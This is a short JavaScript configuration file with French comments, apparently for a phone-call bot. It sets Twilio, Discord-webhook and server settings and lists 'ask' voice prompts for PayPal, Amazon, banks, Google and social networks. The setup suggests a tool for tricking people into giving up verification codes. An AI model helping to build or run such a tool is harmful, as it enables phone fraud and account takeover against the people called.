module.exports = {
    setupdone: 'true',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: '',
    authToken: '',
    callerid: '',

    /**
     * Informations à propos de l'API
     */
    apipassword: '',
    serverurl: 'http://189.107.211.240:1337',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: '',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/en/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/en/ask-twitter.mp3',
    whatsappfilepath: './voice/en/ask-whatsapp.mp3',
    paypalfilepath: './voice/en/ask-paypal.mp3',
    googlefilepath: './voice/en/ask-google.mp3',
    snapchatfilepath: './voice/en/ask-snapchat.mp3',
    instagramfilepath: './voice/en/ask-instagram.mp3',
    facebookfilepath: './voice/en/ask-facebook.mp3',
    endfilepath: './voice/en/call-done.mp3',
    defaultfilepath: './voice/en/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
